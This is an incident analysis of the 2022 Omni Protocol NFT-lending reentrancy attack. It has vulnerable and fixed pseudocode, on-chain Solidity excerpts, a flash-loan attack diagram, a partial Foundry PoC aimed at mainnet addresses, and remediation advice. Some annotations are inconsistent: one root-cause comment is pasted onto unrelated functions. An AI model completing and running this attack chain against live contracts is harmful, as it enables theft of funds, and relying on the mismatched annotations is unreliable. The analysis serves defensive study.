# Omni Protocol — NFT Flash Loan Reentrancy Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-07-28 |
| **Protocol** | Omni Protocol (NFT Lending) |
| **Chain** | Ethereum Mainnet |
| **Loss** | Address unconfirmed (WETH drained) |
| **Attacker** | Address unconfirmed |
| **Vulnerable Contract (Omni Pool)** | [0xEBe72CDafEbc1abF26517dd64b28762DF77912a9](https://etherscan.io/address/0xEBe72CDafEbc1abF26517dd64b28762DF77912a9) |
| **WETH** | [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2](https://etherscan.io/address/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) |
| **Doodles NFT** | [0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e](https://etherscan.io/address/0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e) |
| **Balancer Vault** | [0xBA12222222228d8Ba445958a75a0704d566BF2C8](https://etherscan.io/address/0xBA12222222228d8Ba445958a75a0704d566BF2C8) |
| **Root Cause** | Missing `nonReentrant` on the collateral withdrawal function during `onFlashLoan` callback execution — CEI violation enables collateral withdrawal |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow (Reentrancy) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-07/Omni_exp.sol) |

---
## 1. Vulnerability Overview

Omni Protocol is a protocol that lends WETH against NFT collateral. It supports NFT flash loans via NFTX vaults, and during a flash loan callback (`onFlashLoan`), an attacker was able to withdraw NFTs deposited as collateral before the loan state was finalized. The attacker executed a chained attack: Balancer flash loan → NFTX vault flash loan → deposit NFT collateral into Omni → borrow WETH → withdraw collateral inside the `onFlashLoan` callback → simultaneously hold both the NFT and the borrowed WETH.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable flash loan callback handling (pseudocode)
function onFlashLoan(
    address initiator,
    address token,
    uint256 amount,
    uint256 fee,
    bytes calldata data
) external returns (bytes32) {
    // ❌ No reentrancy protection
    // ❌ External contract calls permitted inside the callback
    // Attacker can withdraw collateral (NFT) from Omni within this callback

    // Execute user-defined logic (calls attack())
    (bool success, ) = initiator.call(data);
    require(success);

    return keccak256("ERC3156FlashBorrower.onFlashLoan");
}

// Omni's collateral withdrawal function
function withdrawCollateral(uint256 tokenId) external {
    // ❌ Does not check whether a flash loan is in progress
    require(loans[msg.sender][tokenId].debt == 0, "debt exists");
    // ❌ On reentrance, debt has not yet been recorded — withdrawal succeeds
    IERC721(nftContract).transferFrom(address(this), msg.sender, tokenId);
}

// ✅ Correct pattern - ReentrancyGuard + CEI pattern
function withdrawCollateral(uint256 tokenId) external nonReentrant {
    require(loans[msg.sender][tokenId].debt == 0, "debt exists");
    delete collaterals[msg.sender][tokenId]; // ✅ Update state first
    IERC721(nftContract).transferFrom(address(this), msg.sender, tokenId);
}
```

---
### On-Chain Source Code

Source: Sourcify verified


**LiquidationLogic.sol** — Entry point:
```solidity
// ❌ Root cause: Missing `nonReentrant` on the collateral withdrawal function during `onFlashLoan` callback execution — CEI violation enables collateral withdrawal
    function executeLiquidationCall(
        mapping(address => DataTypes.ReserveData) storage reservesData,
        mapping(uint256 => address) storage reservesList,
        mapping(address => DataTypes.UserConfigurationMap) storage usersConfig,
        DataTypes.ExecuteLiquidationCallParams memory params
    ) external {
        LiquidationCallLocalVars memory vars;

        DataTypes.ReserveData storage collateralReserve = reservesData[
            params.collateralAsset
        ];
        DataTypes.ReserveData storage debtReserve = reservesData[
            params.liquidationAsset
        ];
        DataTypes.UserConfigurationMap storage userConfig = usersConfig[
            params.user
        ];
        vars.debtReserveCache = debtReserve.cache();
        debtReserve.updateState(vars.debtReserveCache);

    // ... (truncated)
        (
            vars.collateralXToken,
            vars.collateralPriceSource,
            vars.debtPriceSource,
            vars.liquidationBonus
        ) = _getConfigurationData(collateralReserve, params);

        vars.userCollateralBalance = IOToken(vars.collateralXToken).balanceOf(
            params.user
        );

        (
            vars.actualCollateralToLiquidate,
            vars.actualDebtToLiquidate,
            vars.liquidationProtocolFeeAmount
        ) = _calculateAvailableCollateralToLiquidate(
            collateralReserve,
            vars.debtReserveCache,
            vars.collateralPriceSource,
            vars.debtPriceSource,
```

**BorrowLogic.sol** — Related contract:
```solidity
// ❌ Root cause: Missing `nonReentrant` on the collateral withdrawal function during `onFlashLoan` callback execution — CEI violation enables collateral withdrawal
    function executeBorrow(
        mapping(address => DataTypes.ReserveData) storage reservesData,
        mapping(uint256 => address) storage reservesList,
        DataTypes.UserConfigurationMap storage userConfig,
        DataTypes.ExecuteBorrowParams memory params
    ) public {
        DataTypes.ReserveData storage reserve = reservesData[params.asset];
        DataTypes.ReserveCache memory reserveCache = reserve.cache();

        reserve.updateState(reserveCache);

        ValidationLogic.validateBorrow(
            reservesData,
            reservesList,
            DataTypes.ValidateBorrowParams({
                reserveCache: reserveCache,
                userConfig: userConfig,
                asset: params.asset,
                userAddress: params.onBehalfOf,
                amount: params.amount,
    // ... (truncated)
                params.user,
                params.onBehalfOf,
                params.amount,
                reserveCache.nextVariableBorrowIndex
            );
        }

        if (isFirstBorrowing) {
            userConfig.setBorrowing(reserve.id, true);
        }

        reserve.updateInterestRates(
            reserveCache,
            params.asset,
            0,
            params.releaseUnderlying ? params.amount : 0
        );

        if (params.releaseUnderlying) {
            IOToken(reserveCache.xTokenAddress).transferUnderlyingTo(
```

**SupplyLogic.sol** — Related contract:
```solidity
// ❌ Root cause: Missing `nonReentrant` on the collateral withdrawal function during `onFlashLoan` callback execution — CEI violation enables collateral withdrawal
    function executeSupply(
        mapping(address => DataTypes.ReserveData) storage reservesData,
        mapping(uint256 => address) storage reservesList,
        DataTypes.UserConfigurationMap storage userConfig,
        DataTypes.ExecuteSupplyParams memory params
    ) external {
        DataTypes.ReserveData storage reserve = reservesData[params.asset];
        DataTypes.ReserveCache memory reserveCache = reserve.cache();

        reserve.updateState(reserveCache);

        ValidationLogic.validateSupply(
            reserveCache,
            params.amount,
            DataTypes.AssetType.ERC20
        );

        reserve.updateInterestRates(
            reserveCache,
            params.asset,
    // ... (truncated)
            params.amount,
            reserveCache.nextLiquidityIndex
        );

        if (isFirstSupply) {
            userConfig.setUsingAsCollateral(reserve.id, true);
            emit ReserveUsedAsCollateralEnabled(
                params.asset,
                params.onBehalfOf
            );
        }

        emit Supply(
            params.asset,
            msg.sender,
            params.onBehalfOf,
            params.amount,
            params.referralCode
        );
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Balancer.flashLoan(1000 WETH)
    │       └─ Enters receiveFlashLoan() callback
    │
    ├─[2] NFTX Vault.flashLoan(20 Doodle NFTs)
    │       └─ Enters onFlashLoan() callback
    │
    ├─[3] Purchase Doodle NFTs with WETH (swap)
    │
    ├─[4] Omni.supplyNFT(Doodle NFTs) → Deposit NFTs as collateral
    │
    ├─[5] Omni.borrow(WETH, maxAmount) → Borrow maximum WETH
    │
    ├─[6] ⚡ Reentrancy: Omni.withdrawCollateral(NFTs)
    │       └─ Debt state not yet finalized inside callback → NFT withdrawal succeeds
    │           → Simultaneously holds both NFT and WETH
    │
    ├─[7] Return Doodle NFTs to NFTX (repay flash loan)
    │
    └─[8] Repay Balancer flash loan → Net profit secured
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IBalancerVault {
    function flashLoan(address, address[] calldata, uint256[] calldata, bytes calldata) external;
}

interface IDOODLENFTXVault {
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external;
}

interface IOmni {
    function supplyNFT(address nftAsset, uint256 tokenId) external;
    function borrow(address asset, uint256 amount, address onBehalfOf) external;
    function withdrawCollateral(address nftAsset, uint256 tokenId) external;
}

contract OmniExploit is Test {
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IDOODLENFTXVault doodleVault; // NFTX vault
    IOmni omni = IOmni(0xEBe72CDafEbc1abF26517dd64b28762DF77912a9);

    function setUp() public {
        vm.createSelectFork("mainnet", 15_114_361);
    }

    function testExploit() public {
        // [Step 1] Borrow 1000 WETH via Balancer flash loan
        address[] memory tokens = new address[](1);
        tokens[0] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1000 ether;
        balancer.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] memory,
        uint256[] memory amounts,
        uint256[] memory,
        bytes memory
    ) external {
        // [Step 2] Flash loan Doodle NFTs from NFTX vault
        doodleVault.flashLoan(address(this), address(doodleVault), 20, "attack");
        // [Step 8] Repay Balancer
    }

    function onFlashLoan(address, address, uint256, uint256, bytes calldata) external returns (bytes32) {
        // [Step 3] Swap WETH → Doodle NFTs
        // [Step 4] Deposit NFTs as collateral into Omni
        // [Step 5] Borrow maximum WETH
        // [Step 6] ⚡ Reentrancy: Omni.withdrawCollateral() → Secure both NFT and WETH
        // [Step 7] Return NFTs to NFTX
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Reentrancy Attack (Cross-Function Reentrancy) |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **OWASP DeFi** | NFT Collateral Reentrancy |
| **Attack Vector** | Reentrancy into collateral withdrawal during NFT flash loan callback |
| **Preconditions** | NFT flash loan support, no reentrancy protection applied |
| **Impact** | WETH drained (amount unconfirmed) |

---
## 6. Remediation Recommendations

1. **Apply `nonReentrant` modifier**: Apply OpenZeppelin `ReentrancyGuard` to all collateral-related functions.
2. **Disable collateral withdrawal during flash loans**: Maintain a flag indicating an active flash loan and check it within the collateral withdrawal function.
3. **Enforce CEI pattern**: Ensure no external NFT transfer occurs before the collateral state has been recorded.

---
## 7. Lessons Learned

- **Reentrancy risk in NFT protocols**: ERC721 tokens can invoke a recipient callback (`onERC721Received`) on transfer, making it a reentrancy attack vector. All functions handling NFTs must defend against reentrancy.
- **Sophistication of chained flash loan attacks**: This attack chained flash loans across three layers — Balancer → NFTX → Omni. Protocol designers must account for such compound attack scenarios.